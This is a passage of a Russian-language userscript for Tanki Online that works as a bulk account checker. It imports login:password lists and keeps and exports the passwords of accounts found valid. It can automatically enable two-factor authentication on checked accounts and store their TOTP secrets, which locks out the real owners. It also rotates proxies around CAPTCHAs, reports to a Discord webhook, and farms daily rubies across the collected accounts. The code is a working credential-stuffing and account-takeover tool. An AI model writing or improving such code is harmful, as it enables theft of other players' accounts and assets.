        document.getElementById("rub-export-all").addEventListener("click", exportAllRubiesTxt);
        document.getElementById("rub-add").addEventListener("click", () => {
            const modal = document.getElementById("tc-rubies-add-modal");
            if (!modal) return;
            modal.setAttribute("data-theme", CONFIG.THEME);
            modal.classList.add("open");
            const textarea = modal.querySelector("#rubies-add-textarea");
            setTimeout(() => { textarea?.focus(); }, 80);
        });
        document.getElementById("rub-remove").addEventListener("click", () => {
            const input = prompt("Введите логины для удаления из Daily Rubies:");
            if (!input) return;
            const logins = input.split(/[\s,;]+/).map(s => s.trim()).filter(Boolean);
            let removed = 0;
            logins.forEach(l => { if (RUBIES_ACCOUNTS.some(a => a.login === l)) { removeFromRubiesList(l); removed++; } });
            showToast(`Removed: ${removed}`, "info");
            renderRubies();
        });
        document.getElementById("rub-clear").addEventListener("click", () => {
            if (!RUBIES_ACCOUNTS.length) return showToast("Список Daily Rubies уже пуст", "info");
            if (!confirm(`Очистить весь список Daily Rubies?\n\nБудет удалено аккаунтов: ${RUBIES_ACCOUNTS.length}.\nОсновная база Checker останется без изменений.`)) return;
            const count = RUBIES_ACCOUNTS.length;
            clearRubiesAccounts();
            renderRubies();
            updateUI();
            updateRubiesUI();
            showToast(`Список Daily Rubies очищен: ${count}`, "success");
        });

        bindRubiesAllAccountsPanel();
    }

    // =========================================================
    // RENDER — RESULTS (постоянное хранилище валидных)
    // =========================================================
    function renderResults() {
        const el = document.getElementById("tab-results");
        if (!el) return;

        const list = loadValidResults();
        const total = list.length;
        const withBonus = list.filter(r => r.bonusReceived).length;

        el.innerHTML = `
            <div class="tc-section-title">Overview</div>
            <div class="tc-stats">
                <div class="tc-stat">
                    <div class="tc-stat-value">${total}</div>
                    <div class="tc-stat-label">Всего результатов</div>
                    <div class="tc-stat-sub">Постоянное хранилище</div>
                </div>
                <div class="tc-stat">
                    <div class="tc-stat-value">${total}</div>
                    <div class="tc-stat-label">Валидных</div>
                    <div class="tc-stat-sub">status = valid</div>
                </div>
                <div class="tc-stat">
                    <div class="tc-stat-value">${withBonus}</div>
                    <div class="tc-stat-label">С компенсацией</div>
                    <div class="tc-stat-sub">bonusReceived</div>
                </div>
            </div>

            <div class="tc-section-title" style="margin-top:22px">Действия</div>
            <div class="tc-actions">
                <button class="tc-btn tc-btn-primary" id="res-export">${ICONS.download} Экспорт всех</button>
                <button class="tc-btn tc-btn-danger" id="res-clear">🗑 Очистить результаты</button>
            </div>
            <div style="font-size:11px;color:var(--tc-text-dim);margin:4px 0 14px">
                Пароль сохраняется вместе с валидным результатом и попадает в TXT-экспорт. Для старых результатов пароль берётся из основной базы Checker.
            </div>

            <div class="tc-section-title">Список</div>
            <input class="tc-search" id="results-search" placeholder="Поиск по логину / нику / рангу…">
            <div class="tc-account-list" id="results-list" style="max-height:420px;overflow-y:auto"></div>
        `;

        document.getElementById("res-export").addEventListener("click", exportValidResultsTxt);
        document.getElementById("res-clear").addEventListener("click", () => {
            if (!list.length) return showToast("Хранилище уже пусто", "info");
            if (!confirm("Очистить ВСЕ накопленные валидные результаты (" + list.length + ")?")) return;
            clearValidResults();
            renderResults();
            showToast("Результаты очищены", "success");
        });

        const searchEl = document.getElementById("results-search");
        const listEl = document.getElementById("results-list");

        function paint() {
            const q = (searchEl.value || "").trim().toLowerCase();
            let filtered = list;
            if (q) {
                filtered = list.filter(r =>
                    String(r.login || "").toLowerCase().includes(q) ||
                    String(r.username || "").toLowerCase().includes(q) ||
                    String(r.rank || "").toLowerCase().includes(q)
                );
            }
            if (!filtered.length) {
                listEl.innerHTML = `<div class="tc-empty"><h4>Нет результатов</h4><p>Валидные аккаунты появятся здесь после успешной проверки.</p></div>`;
                return;
            }
            listEl.innerHTML = filtered.map(r => {
                const when = r.checkedAt
                    ? new Date(r.checkedAt).toLocaleString("ru-RU", { day: "2-digit", month: "2-digit", year: "numeric", hour: "2-digit", minute: "2-digit" })
                    : "—";
                return `<div class="tc-account-card" data-res-login="${escapeHtml(r.login)}">
                    <div>
                        <div class="login">${escapeHtml(r.username || r.login)}</div>
                        <div class="details">
                            <span class="tag">${escapeHtml(r.login)}</span>
                            <span class="tag">${escapeHtml(r.rank || "—")}</span>
                            <span class="tag">◆${formatAmount(r.rubies || "0")}</span>
                            ${r.bonusReceived ? '<span class="tag accent">✦ bonus</span>' : ""}
                            <span class="tag">${escapeHtml(when)}</span>
                        </div>
                    </div>
                    <button class="tc-btn tc-btn-danger res-del" data-login="${escapeHtml(r.login)}" style="flex:0 0 auto;min-width:0;padding:0 10px">✕</button>
                </div>`;
            }).join("");

            listEl.querySelectorAll(".res-del").forEach(btn => {
                btn.addEventListener("click", e => {
                    e.stopPropagation();
                    const login = btn.dataset.login;
                    if (!confirm("Удалить результат «" + login + "»?")) return;
                    removeValidResult(login);
                    renderResults();
                });
            });
        }

        searchEl.addEventListener("input", paint);
        paint();
    }

    // =========================================================
    // RENDER — 2FA
    // =========================================================
    function render2FA() {
        const el = document.getElementById("tab-twofa");
        if (!el) return;

        if (window.__tanki2FATimer) {
            clearInterval(window.__tanki2FATimer);
            window.__tanki2FATimer = null;
        }

        const list = load2FAAccounts();
        el.innerHTML = `
            <style>
                #tab-twofa .twofa-list{display:flex;flex-direction:column;gap:10px;margin-top:12px;max-height:480px;overflow-y:auto;padding-right:4px;}
                #tab-twofa .twofa-card{
                    display:grid;
                    grid-template-columns:minmax(120px,1fr) minmax(160px,200px) auto;
                    align-items:center;
                    gap:12px 20px;
                    padding:16px 18px;
                    border:1px solid var(--tc-border);
                    border-radius:14px;
                    background:var(--tc-surface);
                }
                #tab-twofa .twofa-card-name{
                    font-size:15px;font-weight:700;color:var(--tc-text);
                    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
                }
                #tab-twofa .twofa-otp-box{
                    display:flex;flex-direction:column;align-items:center;justify-content:center;
                    padding:8px 12px;border-radius:12px;
                    background:rgba(255,255,255,.03);border:1px solid var(--tc-border);
                }
                #tab-twofa .twofa-otp-label{
                    font-size:9px;font-weight:700;text-transform:uppercase;
                    letter-spacing:.1em;color:var(--tc-text-dim);margin-bottom:4px;
                }
                #tab-twofa .twofa-otp-code{
                    font-size:26px;font-weight:800;font-variant-numeric:tabular-nums;
                    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
                    letter-spacing:.16em;color:var(--tc-text);cursor:pointer;user-select:all;
                    line-height:1.15;
                }
                #tab-twofa .twofa-otp-timer{
                    font-size:11px;margin-top:4px;font-variant-numeric:tabular-nums;
                    color:var(--tc-text-muted);
                }
                #tab-twofa .twofa-otp-bar{
                    width:100%;height:3px;margin-top:8px;border-radius:2px;
                    background:rgba(255,255,255,.08);overflow:hidden;
                }
                #tab-twofa .twofa-otp-bar > div{
                    height:100%;border-radius:2px;background:#50e38b;
                    transition:width .2s linear,background .2s;
                }
                #tab-twofa .twofa-card-actions{display:flex;gap:8px;align-items:center;justify-content:flex-end;}
                #tab-twofa .twofa-card-actions .tc-btn{
                    flex:0 0 auto;min-width:72px;height:34px;padding:0 12px;
                    font-size:12px;border-radius:10px;margin:0;
                }
                #tab-twofa .twofa-card-actions .twofa-del{
                    min-width:34px;width:34px;padding:0;font-size:14px;
                }
                #tab-twofa .twofa-import-box{
                    margin-top:8px;padding:14px;border:1px solid var(--tc-border);
                    border-radius:12px;background:var(--tc-surface-2);
                }
                #tab-twofa .twofa-import-box textarea{
                    width:100%;min-height:90px;box-sizing:border-box;padding:10px;
                    border-radius:8px;border:1px solid var(--tc-border);
                    background:var(--tc-surface);color:var(--tc-text);
                    font:12px/1.45 ui-monospace,Consolas,monospace;resize:vertical;
                }
                #tab-twofa .twofa-import-help{font-size:11px;color:var(--tc-text-dim);margin-top:6px;line-height:1.45;}
                @media(max-width:700px){
                    #tab-twofa .twofa-card{grid-template-columns:1fr;gap:12px;}
                    #tab-twofa .twofa-card-actions{justify-content:flex-start;}
                }
            </style>
            <div class="tc-section-title">Overview</div>
            <div class="tc-stats">
                <div class="tc-stat">
                    <div class="tc-stat-value">${list.length}</div>
                    <div class="tc-stat-label">Аккаунтов с 2FA</div>
                    <div class="tc-stat-sub">Для входа в Daily Rubies</div>
                </div>
            </div>

            <div class="tc-section-title" style="margin-top:18px">Импорт с 2FA secret</div>
            <div class="twofa-import-box">
                <textarea id="twofa-import-ta" spellcheck="false" placeholder="login:password:SECRET&#10;login;password;SECRET&#10;&#10;или&#10;Логин - name&#10;Пароль - pass&#10;2FA - SECRET"></textarea>
                <div class="twofa-import-help">
                    Форматы: <code>login:password:SECRET</code> · <code>login;password;SECRET</code> · блок с полями Логин/Пароль/2FA(Secret).<br>
                    После импорта Daily Rubies сможет сам вводить код при входе.
                </div>
                <div class="tc-actions" style="margin-top:10px">
                    <button class="tc-btn tc-btn-primary" id="twofa-import-btn">+ Импортировать</button>
                    <button class="tc-btn tc-btn-primary" id="twofa-export">${ICONS.download} Экспорт TXT</button>
                    <button class="tc-btn tc-btn-danger" id="twofa-clear">🗑 Очистить</button>
                </div>
                <div id="twofa-import-result" style="margin-top:8px;font-size:12px;color:var(--tc-text-muted)"></div>
            </div>

            <div class="tc-section-title" style="margin-top:22px">Список</div>
            <input class="tc-search" id="twofa-search" placeholder="Поиск по нику / логину…">
            <div id="twofa-list" class="twofa-list"></div>
        `;

        document.getElementById("twofa-import-btn").addEventListener("click", () => {
            const ta = document.getElementById("twofa-import-ta");
            const raw = (ta?.value || "").trim();
            if (!raw) return showToast("Вставь аккаунты", "warning");
            const res = import2FAAccountsFromText(raw);
            const out = document.getElementById("twofa-import-result");
            if (out) {
                out.innerHTML = res.added
                    ? `<span style="color:var(--tc-success)">✓ Добавлено/обновлено: ${res.added}</span>` +
                      (res.skipped ? ` · без секрета: ${res.skipped}` : "") +
                      ` · всего: ${load2FAAccounts().length}`
                    : `<span style="color:var(--tc-danger)">Ничего не добавлено</span>`;
            }
            if (res.added) {
                if (ta) ta.value = "";
                showToast(`2FA импорт: +${res.added}`, "success");
                render2FA();
            } else {
                showToast("Не удалось распознать", "warning");
            }
        });

        document.getElementById("twofa-export").addEventListener("click", () => {
            const data = load2FAAccounts();
            if (!data.length) return showToast("Нет записей 2FA", "warning");
            const textOut = data.map(r => {
                return [
                    "--------------------------",
                    "Логин - " + (r.login || "—"),
                    "Пароль - " + (r.password || "—"),
                    "Ник - " + (r.nickname || "—"),
                    "Почта - " + (r.email || "—"),
                    "2FA secret - " + (r.secret || "—"),
                    "Ранг - " + (r.rank || "—"),
                    "Опыт - " + (r.experience != null ? r.experience : "—"),
                    "Рубины - " + formatAmount(r.rubies || "0"),
                    "Кристаллы - " + formatAmount(r.crystals || "0"),
                    "Танкоины - " + formatAmount(r.tankoins || "0"),
                    "Привязан - " + (r.bound === true ? "да" : r.bound === false ? "нет" : "—"),
                    "Год - " + (r.year || "—"),
                    "Активировано - " + (r.activatedAt || "—")
                ].join("\n");
            }).join("\n");
            const blob = new Blob([textOut], { type: "text/plain;charset=utf-8" });
            const a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = "tanki-2fa-" + new Date().toISOString().slice(0, 10) + ".txt";
            a.click();
            setTimeout(() => URL.revokeObjectURL(a.href), 1000);
            showToast("Экспортировано: " + data.length, "success");
        });

        document.getElementById("twofa-clear").addEventListener("click", () => {
            if (!list.length) return showToast("Список уже пуст", "info");
            if (!confirm("Удалить ВСЕ записи 2FA (" + list.length + ")?")) return;
            clear2FAAccounts();
            render2FA();
            showToast("2FA-хранилище очищено", "success");
        });

        const searchEl = document.getElementById("twofa-search");
        const listEl = document.getElementById("twofa-list");

        function getTotpRemaining(step = 30) {
            return step - (Math.floor(Date.now() / 1000) % step);
        }

        function paint() {
            const q = (searchEl.value || "").trim().toLowerCase();
            let filtered = list;
            if (q) {
                filtered = list.filter(r =>
                    String(r.login || "").toLowerCase().includes(q) ||
                    String(r.nickname || "").toLowerCase().includes(q) ||
                    String(r.email || "").toLowerCase().includes(q)
                );
            }
            if (!filtered.length) {
                listEl.innerHTML = `<div class="tc-empty"><h4>Нет аккаунтов с 2FA</h4><p>Импортируй login:password:SECRET или включи AUTO 2FA в Checker.</p></div>`;
                return;
            }
            listEl.innerHTML = filtered.map(r => {
                const displayName = r.nickname || r.login || "—";
                return `<div class="twofa-card" data-twofa-row data-secret="${escapeHtml(r.secret || "")}">
                    <div class="twofa-card-name" title="${escapeHtml(r.login || "")}">${escapeHtml(displayName)}</div>
                    <div class="twofa-otp-box">
                        <div class="twofa-otp-label">Код безопасности</div>
                        <div class="twofa-otp-code" data-twofa-code title="Клик — скопировать">······</div>
                        <div class="twofa-otp-timer" data-twofa-timer>— сек</div>
                        <div class="twofa-otp-bar"><div data-twofa-bar-fill></div></div>
                    </div>
                    <div class="twofa-card-actions">
                        <button type="button" class="tc-btn tc-btn-secondary twofa-copy-code">Код</button>
                        <button type="button" class="tc-btn tc-btn-danger twofa-del" data-login="${escapeHtml(r.login || "")}" title="Удалить">✕</button>
                    </div>
                </div>`;
            }).join("");

            listEl.querySelectorAll(".twofa-copy-code, [data-twofa-code]").forEach(btn => {
                btn.addEventListener("click", e => {
                    e.stopPropagation();
                    const card = btn.closest("[data-twofa-row]");
                    const code = (card?.querySelector("[data-twofa-code]")?.textContent || "").replace(/\D/g, "");
                    if (code.length === 6) copyToClipboard(code);
                    else showToast("Код ещё не готов", "warning");
                });
            });
            listEl.querySelectorAll(".twofa-del").forEach(btn => {
                btn.addEventListener("click", e => {
                    e.stopPropagation();
                    const login = btn.dataset.login;
                    if (!confirm("Удалить «" + login + "»?")) return;
                    remove2FAAccount(login);
                    render2FA();
                });
            });

            refreshLiveCodes();
        }

        async function refreshLiveCodes() {
            const cards = listEl.querySelectorAll("[data-twofa-row]");
            const remaining = getTotpRemaining(30);
            for (const card of cards) {
                const secret = card.getAttribute("data-secret") || "";
                const codeEl = card.querySelector("[data-twofa-code]");
                const timerEl = card.querySelector("[data-twofa-timer]");
                const barFill = card.querySelector("[data-twofa-bar-fill]");
                if (timerEl) {
                    timerEl.textContent = remaining + " сек";
                    timerEl.style.color = remaining <= 5 ? "#ff5c68" : "var(--tc-text-muted)";
                }
                if (barFill) {
                    barFill.style.width = Math.round((remaining / 30) * 100) + "%";
                    barFill.style.background = remaining <= 5 ? "#ff5c68" : remaining <= 10 ? "#f0b429" : "#50e38b";
                }
                if (!secret || !codeEl) continue;
                try {
                    codeEl.textContent = await generateTOTP(secret);
                } catch (_) {
                    codeEl.textContent = "ошибка";
                }
            }
        }

        searchEl.addEventListener("input", paint);
        paint();

        window.__tanki2FATimer = setInterval(() => {
            if (!document.getElementById("tab-twofa")?.classList.contains("active")) {
                clearInterval(window.__tanki2FATimer);
                window.__tanki2FATimer = null;
                return;
            }
            refreshLiveCodes();
        }, 1000);
    }

    // =========================================================
    // RENDER — ACCOUNTS
    // =========================================================
    function renderAccounts() {
        const el = document.getElementById("tab-accounts");
        if (!el) return;
        const years = [...new Set(ACCOUNTS.map(a => a.year).filter(Boolean))].sort((a, b) => b - a);

        el.innerHTML = `
            <div class="tc-section-title">Filters for check</div>
            <div class="tc-mode-row">
                <button class="tc-btn tc-btn-secondary" id="btn-toggle-ranks" style="flex:none">Ranks</button>
                <button class="tc-btn tc-btn-secondary" id="btn-toggle-years" style="flex:none">Year</button>
            </div>
            <div class="tc-selected-info" id="selected-info">Selected: all ranks, all years</div>
            <div class="tc-select-panel" id="rank-panel"></div>
            <div class="tc-select-panel" id="year-panel"></div>

            <div class="tc-section-title" style="margin-top:22px">Library</div>
            <div style="display:flex;gap:8px;margin-bottom:10px">
                <input class="tc-search" id="new-login" placeholder="Login" style="margin:0">
                <input class="tc-search" id="new-pass" placeholder="Password" style="margin:0">
                <button class="tc-btn tc-btn-primary" id="btn-add-acc" style="flex:0 0 110px;min-width:0">Add</button>
            </div>
            <input class="tc-search" id="accounts-search" placeholder="Search accounts…">
            <div class="tc-account-list" id="full-account-list" style="max-height:340px;margin-top:10px"></div>
            <div class="tc-actions">
                <button class="tc-btn tc-btn-danger" id="btn-clear-base">Clear library</button>
            </div>
        `;

        const rankPanel = document.getElementById("rank-panel");
        rankPanel.innerHTML = RANKS_RU.map(r => {
            const checked = selectedRanks.includes(r.rankName) ? "checked" : "";
            return `<label class="tc-select-item"><input type="checkbox" value="${escapeHtml(r.rankName)}" ${checked}> ${r.rankName}</label>`;
        }).join("");
        rankPanel.querySelectorAll("input").forEach(input => {
            input.addEventListener("change", () => {
                if (input.checked) { if (!selectedRanks.includes(input.value)) selectedRanks.push(input.value); }
                else selectedRanks = selectedRanks.filter(r => r !== input.value);
                updateSelectedInfo(); renderFullAccountList();
            });
        });

        const yearPanel = document.getElementById("year-panel");
        if (years.length === 0) {
            yearPanel.innerHTML = '<div style="padding:10px;color:var(--tc-text-dim);font-size:12px">No years in library</div>';
        } else {
            yearPanel.innerHTML = years.map(y => {
                const checked = selectedYears.includes(y) ? "checked" : "";
                return `<label class="tc-select-item"><input type="checkbox" value="${y}" ${checked}> ${y}</label>`;
            }).join("");
            yearPanel.querySelectorAll("input").forEach(input => {
                input.addEventListener("change", () => {
                    const val = parseInt(input.value);
                    if (input.checked) { if (!selectedYears.includes(val)) selectedYears.push(val); }
                    else selectedYears = selectedYears.filter(y => y !== val);
                    updateSelectedInfo(); renderFullAccountList();
                });
            });
        }

        document.getElementById("btn-toggle-ranks").addEventListener("click", () => {
            showRankPanel = !showRankPanel; showYearPanel = false;
            rankPanel.classList.toggle("show", showRankPanel);
            yearPanel.classList.remove("show");
        });
        document.getElementById("btn-toggle-years").addEventListener("click", () => {
            showYearPanel = !showYearPanel; showRankPanel = false;
            yearPanel.classList.toggle("show", showYearPanel);
            rankPanel.classList.remove("show");
        });
        document.getElementById("btn-add-acc").addEventListener("click", () => {
            const login = document.getElementById("new-login").value.trim();
            const password = document.getElementById("new-pass").value.trim();
            if (!login || !password) return showToast("Fill both fields", "warning");
            if (ACCOUNTS.some(a => a.login === login)) return showToast("Already exists", "warning");
            ACCOUNTS.push({ login, password, year: null, bound: null, email: null });
            saveAccounts();
            document.getElementById("new-login").value = "";
            document.getElementById("new-pass").value = "";
            showToast("Added", "success");
            renderAccounts(); renderDashboard();
        });
        document.getElementById("accounts-search").addEventListener("input", e => {
            accountsSearchQuery = e.target.value;
            renderFullAccountList();
        });
        document.getElementById("btn-clear-base").addEventListener("click", () => {
            if (!confirm("Clear the entire library?")) return;
            ACCOUNTS = [];
            saveAccounts();
            shuffledAccounts = [];
            selectedYears = []; selectedRanks = [];
            setRunningState(false);
            updateUI(); renderAccounts(); renderDashboard(); renderRubies();
            showToast("Основная база очищена · Daily Rubies сохранены", "success");
        });

        updateSelectedInfo();
        renderFullAccountList();
    }

    function updateSelectedInfo() {
        const el = document.getElementById("selected-info");
        if (!el) return;
        const ranksText = selectedRanks.length ? selectedRanks.join(", ") : "all ranks";
        const yearsText = selectedYears.length ? selectedYears.join(", ") : "all years";
        el.textContent = `Selected: ${ranksText} | ${yearsText}`;
    }

    function renderFullAccountList() {
        const list = document.getElementById("full-account-list");
        if (!list) return;
        let filtered = [...ACCOUNTS];
        if (selectedYears.length > 0) filtered = filtered.filter(a => a.year && selectedYears.includes(a.year));
        if (selectedRanks.length > 0) {
            filtered = filtered.filter(a => {
                const st = getAccountStatus(a.login);
                const rank = (st?.rank || a.rankFromBase || "").toLowerCase();
                return selectedRanks.some(r => rank.includes(r.toLowerCase()));
            });
        }
        if (accountsSearchQuery) {
            const q = accountsSearchQuery.toLowerCase();
            filtered = filtered.filter(acc => {
                const st = getAccountStatus(acc.login);
                return acc.login.toLowerCase().includes(q) || (st?.username || "").toLowerCase().includes(q) || String(acc.year || "").includes(q);
            });
        }
        if (filtered.length === 0) {
            list.innerHTML = `<div class="tc-empty"><h4>Nothing found</h4></div>`;
            return;
        }
        list.innerHTML = filtered.slice(0, 300).map(acc => {
            const st = getAccountStatus(acc.login);
            const isRubies = isInRubiesList(acc.login) || st?.rubiesEnabled;
            const bonusTag = st?.bonusReceived ? '<span class="tag accent">✦ bonus</span>' : "";
            const rubTag = isRubies ? '<span class="tag accent">💎 rubies</span>' : "";
            return `<div class="tc-account-card" data-login="${escapeHtml(acc.login)}">
                <div>
                    <div class="login">${escapeHtml(acc.login)}</div>
                    <div class="details">
                        <span class="tag">${escapeHtml(st?.username || "—")}</span>
                        <span class="tag">${escapeHtml(st?.rank || acc.rankFromBase || "—")}</span>
                        <span class="tag">${acc.year || "—"}</span>
                        <span class="tag">◆${formatAmount(st?.rubies || "0")}</span>
                        ${bonusTag}${rubTag}
                    </div>
                </div>
            </div>`;
        }).join("");
        list.querySelectorAll(".tc-account-card").forEach(c => {
            c.addEventListener("click", () => {
                selectedAccountLogin = c.dataset.login;
                openDetailModal(selectedAccountLogin);
            });
        });
    }

    // =========================================================
    // RENDER — IMPORT / EXPORT
    // =========================================================
    function renderImport() {
        const el = document.getElementById("tab-import");
        if (!el) return;
        el.innerHTML = `
            <div class="tc-section-title">Import accounts</div>
            <div class="tc-dropzone" id="dropzone">
                <h3>Drop account file here</h3>
                <p>or click to select — TXT · JSON</p>
                <button class="tc-btn tc-btn-secondary" style="flex:none;min-width:0" id="btn-select-file">Select file</button>
                <small>Supported: TXT / JSON</small>
                <input type="file" id="file-input" accept=".txt,.json" style="display:none">
            </div>
            <div class="tc-section-title" style="margin-top:22px">Or paste manually</div>
            <textarea class="tc-import-area" id="import-textarea" placeholder="Ник - example&#10;Пароль - 12345&#10;Почта - mail@mail.ru&#10;Дата регистрации - 14-10-2011&#10;Привязан - да&#10;-&#10;&#10;или nick;password&#10;или nick:password"></textarea>
            <div class="tc-actions">
                <button class="tc-btn tc-btn-primary" id="btn-parse">Parse & add</button>
                <button class="tc-btn tc-btn-secondary" id="btn-clear-import">Clear</button>
            </div>
            <div id="import-result" style="margin-top:12px;color:var(--tc-text-muted);font-size:12px"></div>

            <div class="tc-section-title" style="margin-top:30px">Export</div>
            <div class="tc-actions">
                <button class="tc-btn tc-btn-primary" id="btn-export-txt">${ICONS.download} Download verified TXT</button>
                <button class="tc-btn tc-btn-secondary" id="btn-export-json2">Export JSON</button>
            </div>
            <div style="margin-top:8px;color:var(--tc-text-dim);font-size:11px">
                TXT includes only accounts with status.done === true && status.valid === true.
            </div>
        `;

        const dropzone = document.getElementById("dropzone");
        const fileInput = document.getElementById("file-input");
        document.getElementById("btn-select-file").addEventListener("click", (e) => { e.stopPropagation(); fileInput.click(); });
        dropzone.addEventListener("click", e => { if (e.target.id !== "btn-select-file") fileInput.click(); });
        dropzone.addEventListener("dragover", e => { e.preventDefault(); dropzone.classList.add("dragging"); });
        dropzone.addEventListener("dragleave", () => dropzone.classList.remove("dragging"));
        dropzone.addEventListener("drop", e => {
            e.preventDefault(); dropzone.classList.remove("dragging");
            const file = e.dataTransfer.files[0];
            if (file) readFileIntoTextarea(file);
        });
        fileInput.addEventListener("change", e => {
            const file = e.target.files[0];
            if (file) readFileIntoTextarea(file);
        });

        document.getElementById("btn-parse").addEventListener("click", () => {
            const text = document.getElementById("import-textarea").value;
            if (!text.trim()) return showToast("Paste data first", "warning");
            const parsed = sortAccounts(text);
            if (parsed.length === 0) {
                document.getElementById("import-result").innerHTML = '<span style="color:var(--tc-danger)">Nothing found</span>';
                return;
            }
            const existing = new Set(ACCOUNTS.map(a => String(a.login).trim().toLowerCase()));
            const newAccounts = [];
            let dup = 0;
            for (const acc of parsed) {
                const key = String(acc.login).trim().toLowerCase();
                if (existing.has(key)) { dup++; continue; }
                existing.add(key);
                newAccounts.push(acc);
            }
            ACCOUNTS.push(...newAccounts);
            saveAccounts();
            for (const acc of newAccounts) GM_deleteValue(CONFIG.DB_PREFIX + acc.login);
            shuffledAccounts = []; currentIndex = 0;
            updateUI(); renderDashboard(); renderAccounts();
            document.getElementById("import-result").innerHTML = `
                <div style="color:var(--tc-success)">✓ Added: ${newAccounts.length}</div>
                <div style="color:var(--tc-text-muted);margin-top:4px">Total: ${ACCOUNTS.length}${dup ? ` · duplicates: ${dup}` : ""}</div>
            `;
            showToast(`Added ${newAccounts.length}`, "success");
        });
        document.getElementById("btn-clear-import").addEventListener("click", () => {
            document.getElementById("import-textarea").value = "";
            document.getElementById("import-result").innerHTML = "";
        });
        document.getElementById("btn-export-txt").addEventListener("click", exportVerifiedTxt);
        document.getElementById("btn-export-json2").addEventListener("click", exportDataJSON);
    }

    function readFileIntoTextarea(file) {
        const reader = new FileReader();
        reader.onload = e => {
            document.getElementById("import-textarea").value = e.target.result;
            showToast("File loaded: " + file.name, "info");
        };
        reader.readAsText(file);
    }


    // =========================================================
    // FULL STORAGE WIPE
    // =========================================================
    function wipeAllScriptStorage(options = {}) {
        const keepSettings = options.keepSettings !== false;

        let deleted = 0;
        try {
            const keys = typeof GM_listValues === "function" ? GM_listValues() : [];
            for (const key of keys) {
                const k = String(key || "");
                if (keepSettings && (k === CONFIG.SETTINGS_KEY || k === "tanki_settings_v71")) continue;

                const isData =
                    k.startsWith("tanki_acc_") ||
                    k.startsWith(CONFIG.DB_PREFIX) ||
                    k.startsWith(CONFIG.FAST_VALID_DB_PREFIX) ||
                    k.startsWith("tanki_fv_acc_") ||
                    k === CONFIG.TWOFA_ACCOUNTS_KEY ||
                    k === "tanki_2fa_accounts_v1" ||
                    k === CONFIG.ACCOUNTS_KEY ||
                    k === CONFIG.RUNNING_KEY ||
                    k === CONFIG.MODE_KEY ||
                    k === CONFIG.RUBIES_LIST_KEY ||
                    k === CONFIG.RUBIES_ACCOUNTS_KEY ||
                    k === CONFIG.RUBIES_ARCHIVE_KEY ||
                    k === CONFIG.RUBIES_RUN_QUEUE_KEY ||
                    k === CONFIG.RUBIES_RUN_CURSOR_KEY ||
                    k === CONFIG.RUBIES_LAST_RUN_KEY ||
                    k === CONFIG.RUBIES_HASH_SWITCH_KEY ||
                    k === "tanki_captcha_count_v71" ||
                    k === "tanki_rubies_daily_reset_v80" ||
                    k === "tanki_rubies_show_done_toast" ||
                    k === "tanki_rubies_force_credentials_v83" ||
                    k === "tanki_accounts_v71" ||
                    k === "tanki_running_v71" ||
                    k === "tanki_mode_v71" ||
                    k === "tanki_rubies_list_v71" ||
                    k === "tanki_rubies_accounts_v72" ||
                    k === "tanki_rubies_accounts_archive_v81" ||
                    k === "tanki_rubies_run_queue_v75" ||
                    k === "tanki_rubies_run_cursor_v75" ||
                    k === "tanki_rubies_last_run_v71" ||
                    k === "tanki_rubies_hash_switch_v82";

                if (!isData) continue;
                try {
                    GM_deleteValue(k);
                    deleted++;
                } catch (_) {}
            }
        } catch (e) {
            console.warn("[wipe] GM_listValues failed", e);
        }

        const known = [
            CONFIG.ACCOUNTS_KEY, CONFIG.RUNNING_KEY, CONFIG.MODE_KEY,
            CONFIG.RUBIES_LIST_KEY, CONFIG.RUBIES_ACCOUNTS_KEY, CONFIG.RUBIES_ARCHIVE_KEY,
            CONFIG.RUBIES_RUN_QUEUE_KEY, CONFIG.RUBIES_RUN_CURSOR_KEY, CONFIG.RUBIES_LAST_RUN_KEY,
            CONFIG.RUBIES_HASH_SWITCH_KEY,
            CONFIG.QUEUE_KEY, CONFIG.QUEUE_CURSOR_KEY, CONFIG.EMPTY_LOGIN_RELOAD_KEY,
            CONFIG.FAST_VALID_ACCOUNTS_KEY, CONFIG.FAST_VALID_QUEUE_KEY, CONFIG.FAST_VALID_QUEUE_CURSOR_KEY,
            CONFIG.TWOFA_ACCOUNTS_KEY,
            "tanki_captcha_count_v71", "tanki_rubies_daily_reset_v80",
            "tanki_rubies_show_done_toast", "tanki_rubies_force_credentials_v83"
        ];
        for (const k of known) {
            try { GM_deleteValue(k); } catch (_) {}
        }

        ACCOUNTS = [];
        FAST_VALID_ACCOUNTS = [];
        RUBIES_ACCOUNTS = [];
        RUBIES_ARCHIVE = [];
        shuffledAccounts = [];
        currentIndex = 0;
        isRunning = false;
        isPaused = false;
        selectedAccountLogin = null;
        selectedFilter = "all";
        selectedIssueSubfilter = "all";
        searchQuery = "";
        accountsSearchQuery = "";
        selectedYears = [];
        selectedRanks = [];
        MODE = "checker";

        console.log(`[wipe] Удалено ключей GM: ${deleted}. Настройки скрипта сохранены.`);
        return deleted;
    }

    // =========================================================
    // RENDER — SETTINGS
    // =========================================================
    function renderSettings() {
        const el = document.getElementById("tab-settings");
        if (!el) return;
        el.innerHTML = `
            <div class="tc-section-title">Discord</div>
            <div class="tc-setting-row">
                <div class="tc-setting-label">Webhook URL</div>
                <input class="tc-setting-input" id="set-webhook" type="text" placeholder="https://discord.com/api/webhooks/…">
            </div>
            <div class="tc-section-title" style="margin-top:18px">IP proxy</div>
            <label class="tc-switch" style="margin-bottom:12px">
                <span>Использовать прокси</span>
                <input type="checkbox" id="set-proxy-enabled">
                <span class="tc-switch-track"></span>
            </label>
            <div style="font-size:11px;color:var(--tc-text-dim);margin:-4px 0 12px;line-height:1.45">
                Выключено: скрипт не переключает и не подключает прокси (в т.ч. по batch и CAPTCHA).
                IP_CHECK_ENABLED ниже отвечает только за определение внешнего IP, не за ротацию.
            </div>
            <label class="tc-switch" style="margin-bottom:12px">
                <span>Detect proxy IP and send to Discord</span>
                <input type="checkbox" id="set-ipcheck">
                <span class="tc-switch-track"></span>
            </label>
            <label class="tc-switch" style="margin-bottom:12px">
                <span>Отправлять в Discord уведомления о сборе Daily Rubies</span>
                <input type="checkbox" id="set-rubies-discord">
                <span class="tc-switch-track"></span>
            </label>
            <div class="tc-section-title" style="margin-top:18px">2FA</div>
            <label class="tc-switch" style="margin-bottom:12px">
                <span>Автоматически включать 2FA при проверке (Checker)</span>
                <input type="checkbox" id="set-auto-2fa">
                <span class="tc-switch-track"></span>
            </label>
            <div style="font-size:11px;color:var(--tc-text-dim);margin:-4px 0 14px;line-height:1.45">
